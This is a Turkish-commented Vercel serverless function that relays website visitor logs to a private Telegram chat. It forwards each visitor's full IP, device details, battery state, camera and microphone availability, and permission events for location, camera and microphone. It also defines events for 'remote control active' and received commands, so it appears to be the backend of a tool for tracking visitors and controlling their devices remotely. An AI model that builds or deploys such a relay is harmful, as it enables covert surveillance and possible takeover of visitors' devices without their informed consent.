// 🔐 Telegram Log Serverless Function (Vercel)
// Bu fonksiyon BOT_TOKEN ve CHAT_ID'yi güvenli bir şekilde saklar
// ve frontend'den gelen log verilerini Telegram'a gönderir.
// IP bazlı rate limiting: Aynı IP 5 dakika içinde tekrar log gönderemez

// Environment Variables (Vercel Dashboard'dan ayarlanmalı):
// - TELEGRAM_BOT_TOKEN
// - TELEGRAM_CHAT_ID
// - ALLOWED_ORIGIN (optional, default: *)

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

// IP bazlı rate limiting için geçici cache (memory)
// NOT: Production'da Redis veya Vercel KV kullanılabilir
const ipRateLimitCache = new Map();
const RATE_LIMIT_DURATION = 5 * 60 * 1000; // 5 dakika

// IP adresini al (TAM HALİYLE)
function getIP(ip) {
    if (!ip) return 'Unknown';
    return ip;
}

// User Agent'tan cihaz tipi çıkar
function getDeviceType(userAgent) {
    if (!userAgent) return 'Unknown';
    if (/mobile/i.test(userAgent)) return '📱 Mobile';
    if (/tablet/i.test(userAgent)) return '📱 Tablet';
    return '💻 Desktop';
}

// Browser bilgisi çıkar
function getBrowser(userAgent) {
    if (!userAgent) return 'Unknown';
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Other';
}

// Telegram mesajını formatla
function formatTelegramMessage(logData, ip) {
    const {
        event_type,
        page_url,
        page_title,
        user_agent,
        referrer,
        timestamp,
        scroll_depth,
        device_info,
        additional_data
    } = logData;

    const date = new Date(timestamp);
    const formattedDate = date.toLocaleString('tr-TR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    const deviceType = getDeviceType(user_agent);
    const browser = getBrowser(user_agent);
    const fullIP = getIP(ip);

    // Olay tipine göre emoji ve başlık
    const eventIcons = {
        'page_view': '🌐 YENİ ZİYARET',
        'page_exit': '👋 ZİYARET SONU',
        'button_click': '🖱️ BUTON TIKLAMA',
        'form_submit': '📧 FORM GÖNDERİMİ',
        'project_click': '📂 PROJE GÖRÜNTÜLENDİ',
        'social_click': '📱 SOSYAL MEDYA',
        'download': '⬇️ İNDİRME',
        'consent_granted': '✅ İZİN VERİLDİ',
        'consent_rejected': '❌ İZİN REDDEDİLDİ',
        'location_permission_granted': '📍 KONUM İZNİ VERİLDİ',
        'location_permission_denied': '🚫 KONUM İZNİ REDDEDİLDİ',
        'location_not_supported': '⚠️ KONUM DESTEKLENMİYOR',
        'camera_permission_granted': '📷 KAMERA İZNİ VERİLDİ',
        'camera_permission_denied': '🚫 KAMERA İZNİ REDDEDİLDİ',
        'microphone_permission_granted': '🎤 MİKROFON İZNİ VERİLDİ',
        'microphone_permission_denied': '🚫 MİKROFON İZNİ REDDEDİLDİ',
        'remote_control_started': '🎮 CİHAZ BAĞLANDI - UZAKTAN KONTROL AKTİF',
        'command_received': '📡 KOMUT ALINDI',
        'command_error': '⚠️ KOMUT HATASI'
    };

    const title = eventIcons[event_type] || '🔔 YENİ OLAY';

    let message = `${title}\n`;
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `📅 Tarih: ${formattedDate}\n`;
    message += `📄 Sayfa: ${page_title || 'Unknown'}\n`;
    message += `🔗 URL: ${page_url}\n`;
    message += `🎯 Olay: ${event_type.replace(/_/g, ' ').toUpperCase()}\n`;
    message += `🌍 IP Adresi: ${fullIP}\n`;
    message += `${deviceType} (${browser})\n`;

    if (scroll_depth && scroll_depth !== '0%') {
        message += `📜 Scroll Derinliği: ${scroll_depth}\n`;
    }

    if (referrer && referrer !== '') {
        message += `🔙 Kaynak: ${referrer}\n`;
    }

    // Cihaz bilgileri varsa ekle
    if (device_info && Object.keys(device_info).length > 0) {
        message += `\n💻 Cihaz Bilgileri:\n`;
        if (device_info.screen) message += `  • Ekran: ${device_info.screen}\n`;
        if (device_info.viewport) message += `  • Viewport: ${device_info.viewport}\n`;
        if (device_info.timezone) message += `  • Zaman Dilimi: ${device_info.timezone}\n`;
        if (device_info.language) message += `  • Dil: ${device_info.language}\n`;
        if (device_info.platform) message += `  • Platform: ${device_info.platform}\n`;
        if (device_info.online !== undefined) message += `  • Durum: ${device_info.online}\n`;
        if (device_info.connection_type) message += `  • Bağlantı: ${device_info.connection_type}\n`;
        if (device_info.battery_level) message += `  • Batarya: ${device_info.battery_level} (${device_info.battery_charging})\n`;
        if (device_info.has_camera) message += `  • Kamera: ${device_info.has_camera}\n`;
        if (device_info.has_microphone) message += `  • Mikrofon: ${device_info.has_microphone}\n`;
    }

    // Ek veriler varsa ekle
    if (additional_data && Object.keys(additional_data).length > 0) {
        message += `\n📊 Ek Bilgiler:\n`;
        Object.entries(additional_data).forEach(([key, value]) => {
            const formattedKey = key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
            message += `  • ${formattedKey}: ${value}\n`;
        });
    }

    message += `━━━━━━━━━━━━━━━━`;

    return message;
}

// IP rate limiting kontrolü
function checkRateLimit(ip) {
    const now = Date.now();
    const lastRequestTime = ipRateLimitCache.get(ip);

    if (lastRequestTime && (now - lastRequestTime < RATE_LIMIT_DURATION)) {
        const remainingTime = Math.ceil((RATE_LIMIT_DURATION - (now - lastRequestTime)) / 1000);
        return {
            allowed: false,
            remainingTime: remainingTime
        };
    }

    // Cache'i güncelle
    ipRateLimitCache.set(ip, now);

    // Eski kayıtları temizle (memory sızıntısını önle)
    if (ipRateLimitCache.size > 1000) {
        const oldestKeys = Array.from(ipRateLimitCache.entries())
            .sort((a, b) => a[1] - b[1])
            .slice(0, 500)
            .map(e => e[0]);
        oldestKeys.forEach(key => ipRateLimitCache.delete(key));
    }

    return { allowed: true };
}

// Ana handler fonksiyonu
export default async function handler(req, res) {
    // CORS headers - TAMAMEN AÇ!
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    // OPTIONS request (preflight)
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Sadece POST isteklerini kabul et
    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            error: 'Method not allowed. Use POST.'
        });
    }

    try {
        // IP adresini al (Vercel headers)
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection?.remoteAddress || 
                   'Unknown';

        // Rate limiting kontrolü (sadece page_view için)
        const logData = req.body;
        if (logData && logData.event_type === 'page_view') {
            const rateLimitCheck = checkRateLimit(ip);
            if (!rateLimitCheck.allowed) {
                return res.status(429).json({
                    success: false,
                    error: 'Rate limit exceeded',
                    message: `Please wait ${rateLimitCheck.remainingTime} seconds before visiting again.`,
                    retry_after: rateLimitCheck.remainingTime
                });
            }
        }

        // Environment variables kontrolü
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            console.error('Missing environment variables!');
            return res.status(500).json({
                success: false,
                error: 'Server configuration error'
            });
        }

        // Request body'den log verisini al
        if (!logData || !logData.event_type) {
            return res.status(400).json({
                success: false,
                error: 'Invalid log data. event_type is required.'
            });
        }

        // Telegram mesajını formatla
        const message = formatTelegramMessage(logData, ip);

        // Telegram API'ye POST isteği gönder
        const telegramUrl = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        const telegramData = await telegramResponse.json();

        if (!telegramData.ok) {
            console.error('Telegram API error:', telegramData);
            return res.status(500).json({
                success: false,
                error: 'Failed to send log to Telegram',
                details: telegramData.description
            });
        }

        // Başarılı
        return res.status(200).json({
            success: true,
            message: 'Log sent to Telegram successfully',
            telegram_message_id: telegramData.result.message_id
        });

    } catch (error) {
        console.error('Error in telegram-log handler:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

